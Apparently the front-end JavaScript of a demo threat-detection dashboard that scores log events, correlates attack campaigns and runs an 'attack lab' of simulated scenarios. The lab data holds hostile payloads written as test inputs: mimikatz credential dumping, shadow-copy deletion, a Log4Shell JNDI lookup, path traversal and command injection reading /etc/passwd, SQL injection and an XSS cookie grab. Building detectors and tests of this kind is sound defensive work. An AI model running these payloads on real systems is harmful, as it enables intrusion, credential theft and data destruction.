(function () {
  'use strict';
  var $ = function (s, r) { return (r || document).querySelector(s); };
  var $$ = function (s, r) { return Array.prototype.slice.call((r || document).querySelectorAll(s)); };
  function esc(s) { return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]; }); }
  function get(url) { return fetch(url, { cache: 'no-store' }).then(function (r) { if (!r.ok) throw new Error(r.status); return r.json(); }); }
  function post(url, obj) {
    var body = new URLSearchParams(obj).toString();
    return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body })
      .then(function (r) { return r.json().then(function (j) { if (!r.ok) throw new Error(j.error || r.status); return j; }); });
  }
  function ago(ts) {
    var s = Math.max(0, Math.round((Date.now() - ts) / 1000));
    if (s < 5) return 'just now'; if (s < 60) return s + 's ago'; if (s < 3600) return Math.round(s / 60) + ' min ago';
    return Math.round(s / 3600) + ' h ago';
  }
  function sl(x) { return x === 'API' ? 'API' : x.charAt(0) + x.slice(1).toLowerCase(); }
  function num(n) { return Number(n || 0).toLocaleString('en-IN'); }
  var STAGE = {}, STAGE_ORDER = [], MODEL = null;
  var SCALE = 140;
  var SHORT = { recon: 'Recon', access: 'Initial access', exec: 'Execution', persist: 'Persistence', impact: 'Impact' };
  var BANDS = [['safe', 0, 20, 'SAFE'], ['low', 20, 50, 'LOW'], ['med', 50, 80, 'MEDIUM'], ['high', 80, 100, 'HIGH'], ['crit', 100, 140, 'CRITICAL']];

  /* ---------- risk ruler ---------- */
  function rulerHtml(score, level) {
    var segs = BANDS.map(function (b) {
      var w = (b[2] - b[1]) / SCALE * 100;
      return '<i class="' + b[0] + '" style="width:' + w + '%">' + (w > 13 ? b[3] : '') + '</i>';
    }).join('');
    var ticks = [0, 20, 50, 80, 100, 140].map(function (t) {
      return '<span style="left:' + (t / SCALE * 100) + '%">' + (t === 140 ? '' : t) + '</span>';
    }).join('');
    var pos = Math.min(score, SCALE) / SCALE * 100;
    return '<div class="ruler" role="img" aria-label="Risk score ' + score + ', ' + esc(level || '') + '">' +
      '<div class="ruler-track">' + segs + '</div><div class="ruler-ticks">' + ticks + '</div>' +
      '<div class="needle" style="left:' + pos + '%"><b>' + score + '</b></div></div>';
  }
  function levelOf(score) { return score <= 20 ? 'SAFE' : score <= 50 ? 'LOW' : score <= 80 ? 'MEDIUM' : score <= 100 ? 'HIGH' : 'CRITICAL'; }
  function setRuler(host, score, level) {
    var n = $('.needle', host);
    if (!n) { host.innerHTML = rulerHtml(score, level); return; }
    n.style.left = (Math.min(score, SCALE) / SCALE * 100) + '%';
    $('b', n).textContent = score;
    $('.ruler', host).setAttribute('aria-label', 'Risk score ' + score + ', ' + level);
  }
  function ledgerHtml(ev) {
    if (!ev.rules.length) return '<div class="empty">No rule fired. Score 0, nothing to explain.</div>';
    var rows = ev.rules.map(function (r) {
      return '<tr><td class="pts">+' + r.score + '</td><td class="rn"><span class="chip ' + r.origin + '">' + esc(r.rule) + '</span></td><td class="dt">' + esc(r.detail) +
        (r.technique ? ' <span class="tiny">(' + esc(r.technique.split(' ')[0]) + ')</span>' : '') + '</td></tr>';
    }).join('');
    var sum = ev.rules.reduce(function (a, r) { return a + r.score; }, 0);
    var foot = '<tfoot><tr><td class="pts">' + ev.score + '</td><td colspan="2" class="dt">' + (sum === ev.score ? 'total score' : 'total score (the original engine rejected this request before scoring)') + '</td></tr></tfoot>';
    return '<table class="ledger"><tbody>' + rows + '</tbody>' + foot + '</table>';
  }
  var MEANING = { SAFE: 'Logged only.', LOW: 'Logged and shown on the dashboard.', MEDIUM: 'Alert for an analyst to review.', HIGH: 'Urgent alert.', CRITICAL: 'Source address blocked for 10 minutes.' };
  function verdictHtml(ev) {
    var l = ev.level.toLowerCase();
    return '<div class="verdict v-' + l + '"><span class="lvl ' + ev.level + '">' + ev.level + '</span><span>' + (ev.blocked ? 'Blocked for 10 minutes.' : (MEANING[ev.level] || '')) + '</span></div>';
  }
  function eventPanel(ev) {
    return '<div class="actor"><span class="ip">' + esc(ev.ip || 'host event') + '</span><span class="src ' + ev.source + '">' + sl(ev.source) + '</span>' +
      (ev.place && ev.geoClass !== 'UNAVAILABLE' ? '<span class="tiny mut">' + esc(ev.place) + (ev.geoClass === 'SIMULATED' ? ' (demo location)' : ' (estimated)') + '</span>' : '') + '</div>' +
      '<div class="evsum">' + esc(ev.summary) + '</div>' +
      '<div data-host>' + rulerHtml(ev.score, ev.level) + '</div>' + ledgerHtml(ev) + verdictHtml(ev);
  }

  /* ---------- model ---------- */
  function loadModel() {
    return get('/api/platform/model').then(function (m) {
      MODEL = m;
      m.stages.forEach(function (s, i) { STAGE[s.id] = s; s.idx = i; STAGE_ORDER.push(s.id); });
      ['ruleCount', 'ruleCount2', 'ruleCount3'].forEach(function (id) { var e = document.getElementById(id); if (e) e.textContent = m.counts.total; });
      $('#halfLife').textContent = m.campaign.halfLifeMinutes; $('#stageBonus').textContent = m.campaign.stageBonus;
      $('#escAt').textContent = m.campaign.escalateAt; $('#escAt2').textContent = m.campaign.escalateAt; $('#blkAt').textContent = m.campaign.blockAt;
      renderBands(); renderRulesFilters(); renderRules(); renderChain(); renderExamples();
    });
  }
  function renderBands() {
    $('#bandRuler').innerHTML = rulerHtml(0, 'SAFE');
    $('#bandList').innerHTML = MODEL.bands.map(function (b) {
      return '<div><b>' + b.level + '</b><span class="r">' + b.from + (b.level === 'CRITICAL' ? '+' : '&ndash;' + b.to) + '</span><br>' + esc(b.meaning) + '</div>';
    }).join('');
  }
  function renderExamples() { $$('[data-ruler]').forEach(function (h) { var s = +h.getAttribute('data-ruler'); h.innerHTML = rulerHtml(s, levelOf(s)); }); }

  /* ---------- stepper ---------- */
  var STEPS = [
    { t: 'Collect', s: 'Five sources feed one pipeline', d: 'Web access logs (Apache or Nginx), firewall logs (Windows or Linux), the Windows Security log, Sysmon process events, and an HTTP API. Files are followed live like <code>tail -f</code>; Windows logs are read through the event log.', w: 'Different tools see different parts of an attack. A web log shows the exploit, the firewall shows the scan, Sysmon shows what ran afterwards.', c: ['aegis/ingest/FileTailer', 'aegis/ingest/WindowsEventSource', 'server/ApiServer'] },
    { t: 'Normalise', s: 'Every line becomes one signal', d: 'Each parser turns its raw line into the same small record: kind (web, logon, network, process, audit), address, user, path, command line, port, time. Nothing downstream cares which log it came from.', w: 'One event model means one set of rules works on every source, and adding a new source later means writing only a parser.', c: ['aegis/AegisSignal', 'aegis/ingest/WebAccessLogParser', 'aegis/ingest/FirewallLogParser'] },
    { t: 'Detect', s: '36 rules look independently', d: 'Eleven core detectors and twenty-five AEGIS rules each inspect the signal on their own and return either nothing or points plus the reason. Core detectors keep per-address memory: failed logins, request rate, ports touched, last country, and a running average for anomaly checks.', w: 'Independent rules are easy to test, easy to explain, and one bad rule cannot break the others. Mixing signature, threshold and anomaly rules means evading one style does not evade them all.', c: ['detector/*', 'aegis/rules/*', 'tracking/IpActivityTracker'] },
    { t: 'Score', s: 'Add the points, pick a band', d: 'The score is the sum of every rule that fired. AEGIS rules add their points on top of the core result, and an AEGIS finding is never labelled SAFE. Bands: 0&ndash;20 SAFE, 21&ndash;50 LOW, 51&ndash;80 MEDIUM, 81&ndash;100 HIGH, 101 and above CRITICAL.', w: 'Additive scoring is how real SIEM tools work. It makes false positives cheap (one weak rule cannot block) and evasion expensive (the attacker must stay under every threshold at once).', c: ['engine/RiskScoreEngine', 'engine/ThreatClassifier', 'aegis/AegisPipeline'] },
    { t: 'Respond', s: 'Block only on strong evidence', d: 'A CRITICAL result blocks the source address for 10 minutes. While blocked, further requests are rejected before any analysis, which also protects the engine from a flood.', w: 'Blocking is the only step that can hurt a real user, so it is gated behind the highest band and expires on its own.', c: ['response/AutoResponseService', 'engine/ThreatDetectionEngine'] },
    { t: 'Correlate', s: 'Explain it, place it, connect it', d: 'The result is enriched with reputation from threat-intel feeds (or an honest &ldquo;no data&rdquo;), an estimated location, and grouped into incidents. The campaign correlator then links all events from one address across the five-stage attack chain and ranks them.', w: 'Per-event scoring is blind to patience. Correlation over time is what catches the attacker who takes it slowly.', c: ['aegis/intel/ReputationService', 'aegis/storage/AegisStore', 'platform/CampaignAnalyzer'] }
  ];
  function renderSteps() {
    var ol = $('#steps');
    ol.innerHTML = STEPS.map(function (s, i) {
      return '<li role="presentation"><button role="tab" aria-selected="' + (i === 0) + '" data-i="' + i + '"><span class="n">' + (i + 1) + '</span><span><span class="tt">' + s.t + '</span><span class="ss">' + s.s + '</span></span></button></li>';
    }).join('');
    function show(i) {
      var s = STEPS[i];
      $$('button', ol).forEach(function (b) { b.setAttribute('aria-selected', String(+b.getAttribute('data-i') === i)); });
      $('#stepDetail').innerHTML = '<h3>' + (i + 1) + '. ' + s.t + '</h3><p>' + s.d + '</p><dl><dt>Why this design</dt><dd>' + s.w + '</dd><dt>Where in the code</dt><dd class="codes">' + s.c.map(function (c) { return '<code>' + c + '</code>'; }).join('') + '</dd></dl>';
    }
    ol.addEventListener('click', function (e) { var b = e.target.closest('button'); if (b) show(+b.getAttribute('data-i')); });
    show(0);
  }

  /* ---------- rules table ---------- */
  function renderRulesFilters() {
    $('#rs').innerHTML = '<option value="">All stages</option>' + MODEL.stages.map(function (s) { return '<option value="' + s.id + '">' + esc(s.name) + '</option>'; }).join('') + '<option value="none">Context only</option>';
    var fam = {}; MODEL.rules.forEach(function (r) { fam[r.family] = 1; });
    $('#rf').innerHTML = '<option value="">All families</option>' + Object.keys(fam).map(function (f) { return '<option>' + f + '</option>'; }).join('');
    ['rq', 'ro', 'rs', 'rf'].forEach(function (id) { $('#' + id).addEventListener('input', renderRules); });
  }
  function renderRules() {
    var q = $('#rq').value.toLowerCase(), o = $('#ro').value, s = $('#rs').value, f = $('#rf').value;
    var rows = MODEL.rules.filter(function (r) {
      if (o && r.origin !== o) return false; if (f && r.family !== f) return false;
      if (s === 'none' ? r.stage : (s && r.stage !== s)) return false;
      return !q || (r.id + ' ' + r.trigger + ' ' + r.technique + ' ' + r.caution + ' ' + r.family).toLowerCase().indexOf(q) >= 0;
    });
    $('#ruleTable tbody').innerHTML = rows.map(function (r) {
      var pts = r.min === r.max ? '+' + r.min : r.min + '&ndash;' + r.max;
      return '<tr><td><span class="rule-id">' + r.id + '</span><br><span class="chip ' + r.origin + ' lt">' + (r.origin === 'core' ? 'core' : 'aegis') + '</span> <span class="tag">' + r.family + '</span></td>' +
        '<td>' + esc(r.trigger) + '</td><td class="pts-cell">' + pts + '</td><td>' + (r.stage ? esc(STAGE[r.stage].name) : '<span class="mut">context signal</span>') + '</td>' +
        '<td class="tech">' + (esc(r.technique) || '<span class="mut">&ndash;</span>') + '</td><td class="caution">' + esc(r.caution) + '</td></tr>';
    }).join('') || '<tr><td colspan="6" class="mut">No rule matches those filters.</td></tr>';
    $('#rcount').textContent = 'Showing ' + rows.length + ' of ' + MODEL.rules.length;
  }

  /* ---------- chain + campaigns ---------- */
  function renderChain() {
    $('#chain').innerHTML = MODEL.stages.map(function (s, i) {
      var n = MODEL.rules.filter(function (r) { return r.stage === s.id; }).length;
      return '<div class="node"><span class="dotn">' + (i + 1) + '</span><h3>' + esc(s.name) + '</h3><p>' + esc(s.summary) + '</p><span class="cnt">' + n + ' rules</span> <span class="cnt" data-cnt="' + s.id + '"></span></div>';
    }).join('');
  }
  function stg(list) { return '<span class="stg" title="' + list.length + ' of 5 stages">' + STAGE_ORDER.map(function (id) { return '<i class="' + (list.indexOf(id) >= 0 ? 'on' : '') + '" title="' + esc(STAGE[id].name) + '"></i>'; }).join('') + '</span>'; }
  function meterHtml(risk) {
    var max = 220, w = Math.min(100, risk / max * 100), cls = risk >= MODEL.campaign.blockAt ? 'block' : risk >= MODEL.campaign.escalateAt ? 'escalate' : '';
    return '<div class="meter"><i class="' + cls + '" style="width:' + w + '%"></i><u style="left:' + (MODEL.campaign.escalateAt / max * 100) + '%"></u><u style="left:' + (MODEL.campaign.blockAt / max * 100) + '%"></u></div>';
  }
  function renderCampaigns(list) {
    var counts = {}; list.forEach(function (c) { c.stages.forEach(function (s) { counts[s] = (counts[s] || 0) + 1; }); });
    $$('[data-cnt]').forEach(function (e) { var n = counts[e.getAttribute('data-cnt')] || 0; e.textContent = n ? '\u00b7 ' + n + ' address' + (n > 1 ? 'es' : '') + ' reached it' : ''; });
    var body = list.slice(0, 8).map(function (c) {
      var top = c.rules.slice().sort(function (a, b) { return b.weight - a.weight; }).slice(0, 3).map(function (r) { return '<span class="chip ' + r.origin + ' lt">' + r.rule + '</span>'; }).join(' ');
      var eng = c.blockedByEngine ? 'Blocked' : (c.engineMissed ? '<span class="missed">Not blocked, risk says block</span>' : 'Not blocked');
      return '<tr><td><span class="mono">' + esc(c.actor) + '</span><br>' + c.sources.map(function (s) { return '<span class="src ' + s + '">' + sl(s) + '</span>'; }).join(' ') + '</td><td>' + stg(c.stages) + '</td>' +
        '<td style="min-width:150px"><b class="mono">' + c.risk + '</b> <span class="act ' + c.action + '">' + c.action + '</span>' + meterHtml(c.risk) + '</td><td>' + esc(c.verdict) + '<br><span class="tiny mut">' + c.detections + ' detections</span></td><td>' + eng + '</td><td>' + top + '</td></tr>';
    }).join('');
    $('#campTable tbody').innerHTML = body || '<tr><td colspan="6" class="mut">No detections in the last hour yet.</td></tr>';
  }

  /* ---------- hero + live ---------- */
  var heroId = 0, heroAt = 0;
  function renderHero(recent) {
    if (!recent.length) return;
    var pool = recent.slice(0, 6).sort(function (a, b) { return b.score - a.score; });
    var pick = pool[0];
    var fresh = recent.find(function (e) { return e.source === 'API' && Date.now() - e.ts < 8000; });
    if (fresh) pick = fresh;
    if (pick.id === heroId) { $('#heroWhen').textContent = ago(pick.ts); return; }
    if (!fresh && Date.now() - heroAt < 5000) return;
    heroId = pick.id; heroAt = Date.now();
    var host = $('#hero'), first = !$('.needle', host);
    if (first) { host.innerHTML = eventPanel(pick); void $('.needle', host).offsetWidth; }
    else {
      host.innerHTML = eventPanel(pick);
    }
    $('#heroWhen').textContent = ago(pick.ts);
  }
  function renderKpis(d) {
    var w = d.window, alerts = w.critical + w.high + w.medium + w.low;
    var items = [[num(d.analyzed), 'events analysed since start'], [num(alerts), 'alerts in range (LOW and above)'], [num(w.critical + w.high), 'high or critical'], [num(d.blockedIps), 'addresses blocked now'], [num(d.openIncidents), 'incidents open']];
    $('#kpis').innerHTML = items.map(function (i) { return '<div class="kpi"><div class="v">' + i[0] + '</div><div class="l">' + i[1] + '</div></div>'; }).join('');
  }
  function drawChart(series) {
    var cv = $('#chart'), dpr = window.devicePixelRatio || 1, W = cv.clientWidth, H = cv.clientHeight;
    if (!W) return; cv.width = W * dpr; cv.height = H * dpr;
    var g = cv.getContext('2d'); g.setTransform(dpr, 0, 0, dpr, 0, 0); g.clearRect(0, 0, W, H);
    var L = 34, R = 34, T = 8, B = 20, pw = W - L - R, ph = H - T - B;
    var maxC = 1; series.forEach(function (r) { maxC = Math.max(maxC, r[4] + r[5] + r[6] + r[7]); });
    g.font = '11px sans-serif'; g.fillStyle = '#8FA7BF'; g.strokeStyle = '#27425D'; g.lineWidth = 1;
    for (var i = 0; i <= 4; i++) {
      var y = T + ph - ph * i / 4; g.beginPath(); g.moveTo(L, y); g.lineTo(L + pw, y); g.stroke();
      g.textAlign = 'right'; g.fillText(Math.round(maxC * i / 4), L - 6, y + 4);
      g.textAlign = 'left'; g.fillText(Math.round(SCALE * i / 4), L + pw + 6, y + 4);
    }
    var n = series.length, bw = Math.max(2, pw / n - 2);
    var cols = ['#4ca7f0', '#F2BE2E', '#FF8A3D', '#FF5A5F'];
    series.forEach(function (r, k) {
      var x = L + pw * k / n + 1, base = T + ph, vals = [r[7], r[6], r[5], r[4]];
      vals.forEach(function (v, j) { var h = v / maxC * ph; g.fillStyle = cols[j]; g.fillRect(x, base - h, bw, h); base -= h; });
    });
    g.strokeStyle = '#fff'; g.lineWidth = 1.5; g.beginPath(); var started = false;
    series.forEach(function (r, k) { if (!r[1]) return; var x = L + pw * (k + .5) / n, y = T + ph - Math.min(r[3], SCALE) / SCALE * ph; if (!started) { g.moveTo(x, y); started = true; } else g.lineTo(x, y); });
    g.stroke();
    var a = series.length ? new Date(series[0][0]) : null, b = series.length ? new Date(series[series.length - 1][0]) : null;
    g.fillStyle = '#8FA7BF'; g.textAlign = 'left'; if (a) g.fillText(a.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), L, H - 4);
    g.textAlign = 'right'; if (b) g.fillText(b.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), L + pw, H - 4);
    $('#chartNote').textContent = 'left axis: alerts, right axis: score';
  }
  function renderTop(d) {
    var max = 1; d.topRules.forEach(function (r) { max = Math.max(max, r.actors); });
    $('#topRules').innerHTML = d.topRules.map(function (r) {
      return '<div class="hbar"><span class="nm" title="' + r.rule + '">' + r.rule + '</span><span class="tr"><i class="' + r.origin + '" style="width:' + (r.actors / max * 100) + '%"></i></span><span class="ct">' + r.actors + ' src \u00b7 ' + r.count + '</span></div>';
    }).join('') || '<div class="mut small">No rule has fired yet.</div>';
    var mx = 1; d.stages.forEach(function (s) { mx = Math.max(mx, s.events); });
    $('#stageBars').innerHTML = d.stages.map(function (s) {
      return '<div class="hbar"><span class="nm">' + (SHORT[s.id] || s.id) + '</span><span class="tr"><i class="core" style="width:' + (s.events / mx * 100) + '%"></i></span><span class="ct">' + s.events + '</span></div>';
    }).join('');
  }
  var openRow = null;
  function renderFeed(d) {
    var rows = d.recent.map(function (e) {
      var chips = e.rules.map(function (r) { return '<span class="chip ' + r.origin + '">' + r.rule + ' +' + r.score + '</span>'; }).join('');
      var main = '<tr class="row" data-id="' + e.id + '"><td>' + new Date(e.ts).toLocaleTimeString() + '</td><td><span class="ip">' + esc(e.ip || 'host') + '</span><br><span class="src ' + e.source + '">' + sl(e.source) + '</span></td><td><b class="mono">' + e.score + '</b> <span class="lvl ' + e.level + '">' + e.level + '</span>' + (e.blocked ? ' <span class="tag">blocked</span>' : '') + '</td><td><div class="chips">' + chips + '</div></td></tr>';
      var x = openRow === e.id ? '<tr class="x"><td colspan="4"><div class="evsum" style="margin-bottom:8px">' + esc(e.summary) + '</div>' + ledgerHtml(e) + '</td></tr>' : '';
      return main + x;
    }).join('');
    $('#feed').innerHTML = '<table><thead><tr><th>Time</th><th>Source</th><th>Score</th><th>Rules that fired</th></tr></thead><tbody>' + (rows || '<tr><td colspan="4" class="mut">No detections in this range.</td></tr>') + '</tbody></table>';
  }
  $('#feed').addEventListener('click', function (e) {
    var tr = e.target.closest('tr.row'); if (!tr) return;
    var id = +tr.getAttribute('data-id'); openRow = openRow === id ? null : id; if (lastSummary) renderFeed(lastSummary);
  });
  function renderSources(d) {
    $('#sources').innerHTML = d.sources.map(function (s) {
      var cls = s.state === 'ACTIVE' ? 'on' : s.state === 'ERROR' ? 'err' : s.state === 'WAITING' ? 'wait' : '';
      return '<div class="srcrow"><span class="dot ' + cls + '"></span><span class="nm">' + esc(s.name) + '</span><span class="dt" title="' + esc(s.detail) + '">' + (s.state === 'ACTIVE' ? num(s.count) + ' events' : esc(s.detail)) + '</span></div>';
    }).join('');
  }
  var lastSummary = null;
  function poll() {
    if (document.hidden) return;
    var range = $('#range').value;
    Promise.all([get('/api/platform/summary?range=' + range), get('/api/platform/campaigns?range=60')]).then(function (res) {
      var d = res[0]; lastSummary = d;
      $('#offline').classList.remove('show');
      $('#statusDot').className = 'dot on'; $('#statusText').textContent = 'Engine online \u00b7 ' + num(d.analyzed) + ' events';
      if (MODEL) { renderHero(d.recent); renderKpis(d); drawChart(d.series); renderTop(d); renderFeed(d); renderSources(d); renderCampaigns(res[1].campaigns); }
    }).catch(function () {
      $('#offline').classList.add('show'); $('#statusDot').className = 'dot off'; $('#statusText').textContent = 'Engine offline';
    });
  }
  $('#range').addEventListener('change', poll);
  window.addEventListener('resize', function () { if (lastSummary) drawChart(lastSummary.series); });

  /* ---------- self-test ---------- */
  var ST = null;
  function runSelfTest() {
    $('#stLine').textContent = 'Running verification\u2026';
    get('/api/platform/selftest').then(function (d) {
      ST = d; var ok = d.failed === 0;
      $('#stBig').textContent = d.passed + '/' + d.total; $('#stBig').className = 'big ' + (ok ? 'ok' : 'bad');
      $('#stLine').textContent = ok ? 'All cases pass against the live rule code' : d.failed + ' case(s) failing';
      $('#stSub').textContent = d.cases.filter(function (c) { return c.kind === 'attack'; }).length + ' attacks that must fire, ' + d.cases.filter(function (c) { return c.kind === 'benign'; }).length + ' near-misses that must stay quiet, ' + d.cases.filter(function (c) { return c.kind === 'known-limit'; }).length + ' documented false positives.';
      $('#heroCases').textContent = d.total; $('#whyCases').textContent = d.total; $('#stNot').textContent = d.notCovered.join('; ');
      renderST();
    }).catch(function () { $('#stLine').textContent = 'Self-test unavailable (engine offline)'; });
  }
  var KIND = { attack: 'Attack', benign: 'Near-miss', 'known-limit': 'Known false positive' };
  function renderST() {
    if (!ST) return; var q = $('#stq').value.toLowerCase(), k = $('#stk').value;
    $('#stTable tbody').innerHTML = ST.cases.filter(function (c) { return (!k || c.kind === k) && (!q || (c.rule + ' ' + c.title + ' ' + c.input).toLowerCase().indexOf(q) >= 0); }).map(function (c) {
      var exp = c.expectFire ? (c.expectPoints >= 0 ? '+' + c.expectPoints : 'fires') : 'silent', act = c.actualPoints >= 0 ? '+' + c.actualPoints : 'silent';
      return '<tr><td><span class="res ' + (c.pass ? 'pass' : 'fail') + '">' + (c.pass ? 'PASS' : 'FAIL') + '</span></td><td><span class="rule-id">' + c.rule + '</span></td><td><span class="kind ' + c.kind + '">' + KIND[c.kind] + '</span></td><td>' + esc(c.title) + '</td><td class="mono tiny">' + esc(c.input) + '</td><td class="pts-cell">' + exp + ' &rarr; ' + act + '</td></tr>';
    }).join('');
  }
  $('#stRun').addEventListener('click', runSelfTest); $('#stq').addEventListener('input', renderST); $('#stk').addEventListener('change', renderST);

  /* ---------- attack lab ---------- */
  var WIN = 'C:\\Windows\\System32\\', OFFICE = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE';
  function w(path) { return { kind: 'web', path: path }; }
  var SCN = [
    { id: 'chain', star: true, name: 'Quiet intrusion, all five stages', desc: 'Scan, guess passwords, inject, run malware, steal credentials, hide tracks. Watch for the step where no single score is high but the campaign is.',
      steps: function () {
        var s = [];
        [22, 3389, 445, 3306, 6379].forEach(function (p) { s.push({ label: 'Probe port ' + p, kind: 'port', port: p }); });
        s.push({ label: 'GET /.env', kind: 'web', path: '/.env' }, { label: 'GET /.git/config', kind: 'web', path: '/.git/config' });
        for (var i = 1; i <= 8; i++) s.push({ label: 'Failed login for admin (' + i + ')', kind: 'auth_fail', user: 'admin', country: 'IN' });
        s.push({ label: "SQL injection: ' OR 1=1 --", kind: 'web', path: '/search', body: "id=1' OR 1=1 --" });
        s.push({ label: 'Download update.exe', kind: 'download', file: 'update.exe' });
        s.push({ label: 'Word starts cmd.exe', kind: 'process', path: WIN + 'cmd.exe', command: 'cmd.exe /c whoami /priv', parent: OFFICE });
        s.push({ label: 'mimikatz reads passwords', kind: 'process', path: 'C:\\Users\\Public\\mimikatz.exe', command: 'mimikatz sekurlsa::logonpasswords' });
        s.push({ label: 'New account svc_backup created', kind: 'win', event: 4720, path: 'svc_backup' });
        s.push({ label: 'Delete shadow copies', kind: 'process', path: WIN + 'vssadmin.exe', command: 'vssadmin delete shadows /all /quiet' });
        s.push({ label: 'Security log cleared', kind: 'win', event: 1102 });
        return s;
      } },
    { id: 'guess', name: 'Password guessing', desc: 'Twelve failed logins for admin. Points start at the 5th attempt and stop growing at 50.',
      steps: function () { var s = []; for (var i = 1; i <= 12; i++) s.push({ label: 'Failed login for admin (' + i + ')', kind: 'auth_fail', user: 'admin', country: 'IN' }); return s; } },
    { id: 'sqli', name: 'SQL injection', desc: 'A normal search, then three attack strings. One rule, +40: logged, not blocked.',
      steps: function () { return [{ label: 'Normal search', kind: 'web', path: '/search', body: 'q=blue running shoes' }, { label: "Body: id=1' OR 1=1 --", kind: 'web', path: '/search', body: "id=1' OR 1=1 --" }, { label: 'URL: UNION SELECT', kind: 'web', path: '/items?id=1 UNION SELECT user,pass FROM users' }, { label: 'XSS: script tag', kind: 'web', path: '/comment', body: '<scr' + 'ipt>document.cookie</scr' + 'ipt>' }]; } },
    { id: 'scanner', fixedIp: '185.220.101.1', name: 'Known-bad scanner', desc: 'A blacklisted address using sqlmap. Three rules stack to 105 and the address is blocked. A second request is rejected unanalysed.',
      steps: function () { return [{ label: 'sqlmap injection from a blacklisted address', kind: 'web', path: '/search', body: "id=1' OR 1=1 --", ua: 'sqlmap/1.7' }, { label: 'Follow-up request', kind: 'web', path: '/', ua: 'sqlmap/1.7' }]; } },
    { id: 'ports', name: 'Port sweep', desc: 'Eight ports in a row. The scan rule fires at the fifth distinct port.',
      steps: function () { return [21, 22, 23, 25, 53, 80, 443, 3306].map(function (p) { return { label: 'Probe port ' + p, kind: 'port', port: p }; }); } },
    { id: 'webkit', name: 'Web exploit attempts', desc: 'Log4Shell lookup, directory traversal, command injection and scanner paths in one visit.',
      steps: function () { return [{ label: 'Log4Shell JNDI lookup', kind: 'web', path: '/?x=${jndi:ldap://203.0.113.5/a}' }, { label: 'Traversal to /etc/passwd', kind: 'web', path: '/download?file=../../../../etc/passwd' }, { label: 'Double-encoded traversal', kind: 'web', path: '/a?f=%252e%252e%252fsecret' }, { label: 'Command injection', kind: 'web', path: '/ping?host=8.8.8.8;cat /etc/passwd' }, { label: 'GET /.env', kind: 'web', path: '/.env' }]; } },
    { id: 'travel', name: 'Impossible login', desc: 'The same address reports a login from India, then the US, seconds later.',
      steps: function () { return [{ label: 'Login success, country IN', kind: 'auth_ok', user: 'ravi', country: 'IN' }, { label: 'Login success, country US', kind: 'auth_ok', user: 'ravi', country: 'US' }]; } }
  ];
  var lab = { ip: '', running: false, stop: false, rows: [], sel: -1, maxScore: 0, blocked: false, camp: null, scn: null };
  function newIp() { lab.ip = '203.0.113.' + (100 + Math.floor(Math.random() * 150)); $('#labIp').textContent = lab.ip; }
  function renderScList() {
    $('#scList').innerHTML = SCN.map(function (s) {
      return '<button class="sc" data-id="' + s.id + '" aria-pressed="false"><b>' + s.name + (s.star ? ' <span class="star">start here</span>' : '') + '</b><span>' + s.desc + '</span></button>';
    }).join('');
  }
  function pickScenario(id) {
    lab.scn = SCN.filter(function (s) { return s.id === id; })[0];
    $$('#scList .sc').forEach(function (b) { b.setAttribute('aria-pressed', String(b.getAttribute('data-id') === id)); });
    $('#labRun').disabled = false;
  }
  $('#scList').addEventListener('click', function (e) { var b = e.target.closest('.sc'); if (b) pickScenario(b.getAttribute('data-id')); });
  $$('[data-scn]').forEach(function (b) { b.addEventListener('click', function () { pickScenario(b.getAttribute('data-scn')); document.getElementById('lab').scrollIntoView(); runLab(); }); });
  function resetLab() {
    lab.rows = []; lab.sel = -1; lab.maxScore = 0; lab.blocked = false; lab.camp = null;
    $('#labLog').innerHTML = ''; $('#labFinal').hidden = true;
    $('#labEvent').innerHTML = '<div class="empty">Waiting for the first step.</div>'; $('#labChain').innerHTML = '<div class="empty">The chain fills in as steps arrive.</div>';
  }
  function logHtml() {
    return '<table><tbody>' + lab.rows.map(function (r, i) {
      var ev = r.ev; var rl = ev.rules.filter(function (x) { return x.rule !== 'IP_ALREADY_BLOCKED'; });
      var chips = ev.rules.map(function (x) { return '<span class="chip ' + x.origin + '">' + x.rule + ' +' + x.score + '</span>'; }).join(' ');
      return '<tr data-i="' + i + '" class="' + (i === lab.sel ? 'sel' : '') + '"><td class="n">' + (i + 1) + '</td><td><div class="act-t">' + esc(r.step.label) + '</div>' + (chips ? '<div style="margin-top:3px">' + chips + '</div>' : '') + '</td><td class="sc-t">' + ev.score + ' <span class="lvl ' + ev.level + '">' + ev.level + '</span>' + (ev.blocked ? ' <span class="tag">blocked</span>' : '') + '</td></tr>';
    }).join('') + '</tbody></table>';
  }
  function showSel(i) {
    lab.sel = i; var r = lab.rows[i]; if (!r) return;
    $('#labEvent').innerHTML = eventPanel(r.ev);
    $$('#labLog tr').forEach(function (tr) { tr.className = (+tr.getAttribute('data-i') === i) ? 'sel' : ''; });
  }
  $('#labLog').addEventListener('click', function (e) { var tr = e.target.closest('tr'); if (tr) showSel(+tr.getAttribute('data-i')); });
  function chainPanel(c) {
    if (!c) { return '<div class="empty">No rule has fired for this actor yet.</div>'; }
    var nodes = STAGE_ORDER.map(function (id, i) {
      var on = c.stages.indexOf(id) >= 0;
      return '<div style="display:flex;gap:10px;align-items:center;margin-bottom:6px"><span class="stg"><i class="' + (on ? 'on' : '') + '" style="width:18px;height:18px"></i></span><span style="' + (on ? 'color:#fff;font-weight:600' : 'color:var(--conmut)') + '">' + (i + 1) + '. ' + esc(STAGE[id].name) + '</span></div>';
    }).join('');
    var cls = c.risk >= MODEL.campaign.blockAt ? 'block' : c.risk >= MODEL.campaign.escalateAt ? 'escalate' : '';
    return nodes + '<div style="margin-top:12px"><b class="mono" style="color:#fff;font-size:1.1rem">' + c.risk + '</b> <span class="act ' + c.action + '">' + c.action + (c.action === 'BLOCK' ? ' recommended' : '') + '</span> <span class="tiny mut">campaign risk</span></div><div class="dark" style="margin-top:6px">' + meterHtml(c.risk) + '</div>' +
      '<div class="tiny mut" style="margin-top:6px">Original engine: ' + (lab.blocked ? 'blocked this address' : 'has not blocked it') + ' \u00b7 highest single event: ' + lab.maxScore + ' (' + levelOf(lab.maxScore) + ')</div>';
  }
  function finalHtml() {
    var c = lab.camp, n = lab.rows.length;
